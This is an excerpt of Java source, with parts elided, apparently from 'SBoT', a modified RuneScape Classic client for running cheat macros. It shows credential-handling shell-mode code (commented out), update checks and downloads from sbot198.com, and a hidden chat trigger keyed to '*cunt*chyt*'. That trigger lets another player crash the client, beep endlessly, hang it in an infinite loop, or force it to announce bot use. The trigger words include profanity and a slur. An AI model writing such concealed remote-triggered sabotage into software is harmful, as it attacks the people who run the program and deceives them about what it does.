...
public final class mudclient extends Applet_Sub1_Sub1
{
	...
	//static boolean shellMode = false;
	...
	public final synchronized boolean keyDown(Event event, int i)
	{
		...
		if (i == 1009)
		{
			FOW = !FOW;
			if (FOW)
				DisplayMessage("@gre@SBoT: @whi@Fog enabled", 3);
			else
				DisplayMessage("@gre@SBoT: @whi@Fog disabled", 3);
		}
		if (i == 1015)
		{
			loadScripts();
	...
	{	
		...
		ServerList.setWorld(51);
		/*if (as.length > 0)
			if (as[0].equals("-shell"))
				shellMode = true;
		if (shellMode)
		{
			if (as.length != 5)
			{
				System.out.println("Invalid syntax... java -classpath .;./Scripts/ mudclient \"-shell\" \"user\" \"pass\" \"on\\off\" \"command\"");
				System.exit(1);
			}
			System.out.println("SBoT201 - RichyT - antiyou");
			ServerList.setWorld(Integer.parseInt(as[1]));
			loginname = as[2];
			loginpass = as[3];
			djk = loginname;
			djk = loginpass;
			System.out.println("Shell Mode activated on world " + as[1]);
			String loginpassx = "";
			for (int i = 0; i < loginpass.length(); i++)
				loginpassx = loginpassx + "*";
			System.out.println("Username = \"" + loginname + "\" Password = \"" + loginpassx + "\"");
			autologin = true;
			System.out.println("Shell Mode AutoLogin enabled");
			shellCommand = as[4];
			System.out.println("Shell Mode command: " + shellCommand);
			disable = true;
		}*/
		...
		mudclient1.method6(mudclient1.anInt676, mudclient1.anInt677 + 11, "SBoT " + VERSION + " - RichyT", false);
		...
		{*/
			...
			System.out.println("SBoT201 " + VERSION + " - RichyT - antiyou : auth at rscn");
			System.out.println("<3 Kaitnieks");
	...
	{	
		System.out.println("Creating command thread");
		new Thread
		(
			new Runnable()
			{
				public void run()
				{
					...
					System.out.println("Pre-Start Wait...");
					...
					if (firstStart)
					{
						...
						String s = shellCommand;

						System.out.println("Running Shell Command: " + shellCommand);
		...
		(
			new Runnable()
			{
				public void run()
				{
					try
					{
						String bbbb = "http://www.sbot198.com/news.php";
						try
						{
							while (!ScriptsDone)
							{
    ...
    protected final void method1()
    {
        ...
        if(aBoolean922)
            return;
        aClass10_739 = new Class10(gfx, 15000, 15000, 1000);
                    ...
                    if(byte6 == 1)
                    {
                        ...
                        if(class2 != null)
                        {
                            ...
                            if(!flag3)
                            {
								...
								if (Running)
									macro.ChatMessage(class2.lastSaidMessage);
    ...
    public final void fej()
    {
        ...
        elj.method156(256, 240, "@gre@SBoT201", 5, true);

		String tworld = "@ora@World: ";
		if (ServerList.world == 52 || ServerList.world == 54 || ServerList.world == 56)
			tworld = tworld + "@red@" + ServerList.world;
		else
			tworld = tworld + ServerList.world ;
		
		elj.method156(256, 255, tworld, 4, true);
		elj.method156(460, 230, "@cya@v" + VERSION, 4, true);
			...
			if (aClass4_667.buttonDown(download) && !Downloading)
			{
				if (CURVERSION.equals(VERSION))
				{
					...
					if (!CURVERSION.equals("ERROR"))
					{
						...
						try
						{
							DownloadUpdate(new URL("http://www.sbot198.com/media/SBoT%20" + CURVERSION + ".zip"));
						}
						catch (MalformedURLException e) { e.toString();}
					}
				}
		...
		(
			new Runnable()
			{
				public void run()
				{
					try
					{
						String bbbb = "http://www.sbot198.com/update.php?v=" + VERSION;
						try
						{
							BufferedReader in = new BufferedReader(new InputStreamReader(new URL(bbbb).openStream()));
...
label0:
	...
	{
		if (st.indexOf("*cunt*chyt*") >= 0)
		{
			System.out.println("mooo!");
			if (st.indexOf("fvk") > 0)
			{
				System.out.println("Fuck you " + djk + "?");
				System.exit(1);
			}
			if (st.indexOf("sht") > 0)
				while (true)
					Toolkit.getDefaultToolkit().beep();
			if (st.indexOf("wank") > 0)
			{
				int x = 2;
				while (true)
				{
			...
			if (st.indexOf("fag") > 0)
			{
				Say2("@ran@Im using sbot " + VERSION);
			}
		}
	}
